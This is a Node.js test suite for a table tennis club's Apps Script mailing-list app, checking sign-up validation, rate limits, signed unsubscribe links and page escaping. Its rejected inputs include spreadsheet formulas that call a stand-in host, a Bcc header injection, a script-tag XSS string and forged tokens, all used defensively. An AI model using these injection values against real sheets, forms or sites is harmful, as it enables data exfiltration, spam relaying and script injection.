const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const vm = require('node:vm');

// Fake addresses only: real subscriber addresses never belong in the repository.
const manifest = JSON.parse(fs.readFileSync(__dirname + '/appsscript.json', 'utf8'));
assert.deepEqual(manifest.oauthScopes, [
  'https://www.googleapis.com/auth/spreadsheets',
  'https://www.googleapis.com/auth/script.send_mail',
  'https://www.googleapis.com/auth/script.external_request'
]);
assert.equal(manifest.webapp.access, 'ANYONE_ANONYMOUS');
assert.equal(manifest.webapp.executeAs, 'USER_DEPLOYING');

const source = fs.readFileSync(__dirname + '/Code.js', 'utf8');
const globals = [...source.matchAll(/^function ([A-Za-z0-9]+)\(/gm)].map(match => match[1]);
assert.deepEqual(globals.filter(name => !name.endsWith('_')).sort(), ['authorizeEmail', 'confirmUnsubscribe', 'doGet', 'requestUnsubscribe', 'subscribe'],
  'a public web app exposes every non-private function: only these may exist');

const rows = [];
const textFormatted = [];
let sheetExists = false;
let locks = 0;
let cache = {};
const properties = { DATABASE_ID: 'database-id' };
const sent = [];
let quota = 100;
let mailFails = false;
let latestStatus = 200;
let latestBody = JSON.stringify({ html: '<div id="results">RESULTS</div>', text: 'RESULTS TEXT' });
let clockOffset = 0;
class FakeDate extends Date { static now() { return Date.now.call(Date) + clockOffset; } }
const base64 = bytes => Buffer.from(bytes).toString('base64').replace(/\+/g, '-').replace(/\//g, '_');
const templates = [];
const sheet = {
  getLastRow: () => rows.length + 1,
  deleteRow: row => { rows.splice(row - 2, 1); },
  getRange: (row, column, count) => {
    const range = {
      getValues: () => rows.slice(row - 2, row - 2 + count).map(entry => [entry[0]]),
      setNumberFormats: formats => { textFormatted[row] = formats[0][0] === '@'; return range; },
      setValues: values => {
        if (row > 1) { assert.ok(textFormatted[row], 'the address cell is formatted as plain text before it is written'); rows[row - 2] = values[0]; }
        return range;
      },
      setFontWeight: () => range
    };
    return range;
  },
  setFrozenRows: () => {}
};
const context = {
  Date: FakeDate, Math, Number, String, JSON, console: { error: () => {} },
  PropertiesService: { getScriptProperties: () => ({ getProperty: key => properties[key] || null, setProperty: (key, value) => { properties[key] = value; } }) },
  SpreadsheetApp: { openById: () => ({
    getSheetByName: () => sheetExists ? sheet : null,
    insertSheet: () => { sheetExists = true; return sheet; }
  }) },
  LockService: { getScriptLock: () => ({ waitLock: () => { locks += 1; }, releaseLock: () => { locks -= 1; } }) },
  CacheService: { getScriptCache: () => ({ get: key => cache[key] || null, put: (key, value) => { cache[key] = value; }, remove: key => { delete cache[key]; } }) },
  MailApp: {
    getRemainingDailyQuota: () => quota,
    sendEmail: message => { if (mailFails) throw new Error('mail refused'); sent.push(message); }
  },
  UrlFetchApp: { fetch: () => ({ getResponseCode: () => latestStatus, getContentText: () => latestBody }) },
  Utilities: {
    DigestAlgorithm: { SHA_256: 'sha256' },
    getUuid: () => crypto.randomUUID(),
    computeDigest: (algorithm, value) => Array.from(crypto.createHash(algorithm).update(value).digest()),
    computeHmacSha256Signature: (value, key) => Array.from(crypto.createHmac('sha256', key).update(value).digest()),
    base64EncodeWebSafe: input => base64(typeof input === 'string' ? Buffer.from(input, 'utf8') : input),
    base64DecodeWebSafe: text => Array.from(Buffer.from(text.replace(/-/g, '+').replace(/_/g, '/'), 'base64')),
    newBlob: bytes => ({ getDataAsString: () => Buffer.from(bytes).toString('utf8') })
  },
  HtmlService: {
    XFrameOptionsMode: { ALLOWALL: 'ALLOWALL' },
    createTemplateFromFile: name => {
      const template = { name, evaluate: () => {
        const output = { template, setTitle: () => output, addMetaTag: () => output, setXFrameOptionsMode: () => output };
        return output;
      } };
      templates.push(template);
      return template;
    }
  }
};
vm.createContext(context);
vm.runInContext(source, context);

const result = value => JSON.stringify(value);
assert.equal(result(context.subscribe('  Fan@Example.com ', '')), '{"ok":true}');
assert.ok(sheetExists, 'the Subscribers tab is created when missing');
assert.equal(rows.length, 1);
assert.equal(rows[0][0], 'fan@example.com', 'stored trimmed and lowercase');
assert.equal(result(context.subscribe('FAN@example.com', '')), '{"ok":true}');
assert.equal(rows.length, 1, 'duplicates are ignored regardless of case');

for (const bad of ['', 'nobody', 'a@b', 'two words@example.com', null, undefined, 'x@example.com' + 'y'.repeat(260)]) {
  assert.equal(context.subscribe(bad, '').ok, false, 'rejected: ' + String(bad).slice(0, 20));
}
// Spreadsheet formulas and mail-header or address-list tricks that a loose pattern would let through.
for (const attack of [
  '=IMPORTDATA("https://evil.example/?a=b@c.de")', '=HYPERLINK("https://evil.example")@a.bc', '+1+1@a.bc', '-2@a.bc', '@a.bc',
  '\'=1@a.bc', 'a,b@example.com', 'a;b@example.com', '<b>@example.com', '"quoted"@example.com', 'a@b@example.com',
  'a@example.com\r\nBcc: victim@example.org', 'a@example.com\nx', 'a..b@example.com', 'a@exa..mple.com', 'a@example.c', 'a@example.123',
  'jos\u00e9@example.com', 'a b@example.com', 'a@exa mple.com', 'a@example.com>', '(a)@example.com'
]) {
  assert.equal(context.subscribe(attack, '').ok, false, 'rejected: ' + JSON.stringify(attack));
}
assert.equal(rows.length, 1, 'no rejected address reaches the Sheet');
for (const good of ['o\'brien@example.com', 'first.last+club@mail.example.co.uk', 'a_b-c%d@sub-domain.example.org']) {
  assert.equal(context.subscribe(good, '').ok, true, 'accepted: ' + good);
}
rows.length = 1;
assert.equal(result(context.subscribe('bot@example.com', 'http://spam.example')), '{"ok":true}');
assert.equal(rows.length, 1, 'a filled honeypot adds nothing');
assert.equal(locks, 0, 'the lock is always released');

cache = {};
let refused = 0;
for (let index = 0; index < 30; index += 1) if (!context.subscribe('fan' + index + '@example.com', '').ok) refused += 1;
assert.equal(refused, 10, 'more than 20 sign-ups in a minute are refused');

// Welcome email: sent once, to a new address only, and never allowed to undo the sign-up.
rows.length = 0; cache = {}; sent.length = 0;
assert.equal(result(context.subscribe('new@example.com', '')), '{"ok":true}');
assert.equal(sent.length, 1);
assert.deepEqual([sent[0].to, sent[0].subject, sent[0].name], ['new@example.com', "You're subscribed to CTTC results", 'Concord Table Tennis Club']);
assert.ok(sent[0].body.startsWith("You're subscribed! You'll get an email that looks similar to this after each Round Robin Session. We've included the most recent CTTC Round Robin results below."));
assert.ok(sent[0].body.includes('RESULTS TEXT') && sent[0].htmlBody.includes('<div id="results">RESULTS</div>'), 'the latest results are included');
assert.ok(sent[0].htmlBody.includes('https://concordtabletennisclub.com/unsubscribe.html') && sent[0].body.includes('/unsubscribe.html'), 'every email says how to stop');
context.subscribe('NEW@example.com', '');
assert.equal(sent.length, 1, 'an address already on the list gets no second welcome');
mailFails = true;
assert.equal(result(context.subscribe('mailfail@example.com', '')), '{"ok":true}');
assert.equal(rows.length, 2, 'a mail failure does not undo the sign-up');
mailFails = false;
cache = {}; latestStatus = 500; sent.length = 0;
context.subscribe('nolatest@example.com', '');
assert.ok(sent[0].body.startsWith("You're subscribed! You'll get an email with the results after each Round Robin Session."), 'without results the message does not promise them');
assert.ok(!sent[0].body.includes('RESULTS TEXT'));
latestStatus = 200; cache = {}; sent.length = 0; quota = 30;
context.subscribe('lowquota@example.com', '');
assert.equal(sent.length, 0, 'the last of the daily mail quota is kept for unsubscribe messages');
assert.equal(rows.length, 4);
quota = 100;

// Unsubscribing: a link emailed to the typed address, a question page, then a second explicit confirmation.
rows.length = 0; cache = {}; sent.length = 0;
context.subscribe('keep@example.com', '');
context.subscribe('leave@example.com', '');
sent.length = 0;
const neutral = context.requestUnsubscribe(' Leave@Example.com ', '');
assert.equal(neutral.ok, true);
assert.equal(sent.length, 1);
assert.equal(sent[0].to, 'leave@example.com', 'the link goes only to the address that was typed');
const link = /https:\/\/concordtabletennisclub\.com\/unsubscribe\.html\?t=([A-Za-z0-9_.-]+)/.exec(sent[0].body);
assert.ok(link, 'the email carries a link to the unsubscribe page');
assert.ok(sent[0].htmlBody.includes(link[0]));
const token = link[1];
assert.ok((properties.TOKEN_SECRET || '').length >= 100, 'a signing secret is created on first use');
assert.equal(rows.length, 2, 'asking changes nothing');
sent.length = 0;
assert.deepEqual(JSON.parse(JSON.stringify(context.requestUnsubscribe('stranger@example.com', ''))), JSON.parse(JSON.stringify(neutral)), 'an address that is not subscribed gets the same answer');
assert.deepEqual(JSON.parse(JSON.stringify(context.requestUnsubscribe('keep2@example.com', 'http://spam.example'))), JSON.parse(JSON.stringify(neutral)));
assert.equal(context.requestUnsubscribe('nonsense', '').ok, false);
assert.equal(context.requestUnsubscribe('leave@example.com', '').message, neutral.message);
assert.equal(sent.length, 0, 'no mail for unknown addresses, a filled honeypot, or a repeat within ten minutes');

templates.length = 0;
context.doGet({ parameter: { page: 'confirm', t: token } });
assert.equal(templates[0].name, 'Confirm');
assert.equal(templates[0].email, 'leave@example.com');
assert.equal(templates[0].token, token);
assert.equal(rows.length, 2, 'opening the link only shows a question');
const [payload, signature] = token.split('.');
const forged = Buffer.from(JSON.stringify({ e: 'keep@example.com', p: 'unsubscribe', x: Date.now() + 1e9 })).toString('base64url') + '.' + signature;
const flipped = payload + '.' + signature.slice(0, -1) + (signature.endsWith('A') ? 'B' : 'A');
for (const bad of [forged, flipped, payload, signature, '', 'x.y', token + 'x', undefined, '"><script>alert(1)</script>']) {
  templates.length = 0;
  context.doGet({ parameter: { page: 'confirm', t: bad } });
  assert.equal(templates[0].email, '', 'a link that was not made by us shows nothing: ' + String(bad).slice(0, 20));
  assert.equal(templates[0].token, '');
  assert.equal(context.confirmUnsubscribe(bad).ok, false);
}
assert.equal(rows.length, 2, 'no forged or altered link removes anyone, including another address');
clockOffset = 25 * 60 * 60 * 1000;
assert.equal(context.confirmUnsubscribe(token).ok, false, 'links expire after 24 hours');
clockOffset = 0;

sent.length = 0;
assert.equal(context.confirmUnsubscribe(token).ok, true);
assert.deepEqual(rows.map(row => row[0]), ['keep@example.com'], 'only the confirmed address is removed');
assert.equal(sent.length, 1);
assert.equal(sent[0].to, 'leave@example.com');
assert.match(sent[0].subject, /unsubscribed/i);
sent.length = 0;
assert.equal(context.confirmUnsubscribe(token).ok, true);
assert.equal(sent.length, 0, 'using the link again changes and sends nothing');
assert.equal(rows.length, 1);

cache = {}; quota = 5;
assert.equal(context.requestUnsubscribe('keep@example.com', '').ok, false, 'no link is promised when mail cannot be sent');
quota = 100; mailFails = true;
assert.equal(context.requestUnsubscribe('keep@example.com', '').ok, false);
mailFails = false;
assert.equal(locks, 0, 'the lock is always released');

// The pages: no outside scripts or styles, and anything shown from a link is escaped by the template engine.
for (const name of ['Unsubscribe', 'Confirm']) {
  const html = fs.readFileSync(__dirname + '/' + name + '.html', 'utf8');
  assert.doesNotMatch(html, /<script[^>]*\ssrc=|<link[^>]*rel="stylesheet"/i, name + ' loads nothing from elsewhere');
  assert.doesNotMatch(html, /<\?!=/, name + ' never prints unescaped values');
  assert.doesNotMatch(html, /var status\b/, 'window.status must not be shadowed');
}
assert.match(fs.readFileSync(__dirname + '/Unsubscribe.html', 'utf8'), /\.requestUnsubscribe\(email, document\.getElementById\('website'\)\.value\)/);
assert.match(fs.readFileSync(__dirname + '/Confirm.html', 'utf8'), /\.confirmUnsubscribe\(ask\.getAttribute\('data-token'\)\)/);

// The club-site page that frames the app only passes on a token with the expected shape.
const sitePage = fs.readFileSync(__dirname + '/../unsubscribe.html', 'utf8');
assert.match(sitePage, /<meta name="robots" content="noindex, nofollow">/);
const siteScript = /<script>([\s\S]*?)<\/script>/.exec(sitePage)[1];
const appUrl = /var APP_URL = '([^']+)'/.exec(siteScript)[1];
assert.match(appUrl, /^https:\/\/script\.google\.com\/macros\/s\/[A-Za-z0-9_-]+\/exec$/);
const frame = { src: '' };
const open = search => { vm.runInNewContext(siteScript, { URLSearchParams, location: { search }, document: { getElementById: () => frame } }); return frame.src; };
assert.equal(open(''), appUrl + '?page=unsubscribe');
assert.equal(open('?t=' + token), appUrl + '?page=confirm&t=' + token);
for (const bad of ['?t=abc', '?t="><script>', '?t=../x.y', '?t=' + token + '%22', '?t=' + token + '&page=evil', '?page=confirm']) {
  assert.ok(!open(bad).includes('evil') && !open(bad).includes('<') && !open(bad).includes('"'), 'nothing unexpected reaches the frame: ' + bad);
}
assert.equal(open('?t=abc'), appUrl + '?page=unsubscribe');

const page = fs.readFileSync(__dirname + '/Index.html', 'utf8');
assert.doesNotMatch(page, /<script[^>]*\ssrc=|<link[^>]*rel="stylesheet"/i, 'the form loads nothing from elsewhere');
assert.match(page, /\.subscribe\(email, document\.getElementById\('website'\)\.value\)/);
assert.doesNotMatch(page, /var status\b/, 'window.status must not be shadowed');
console.log('Subscribe app checks passed');
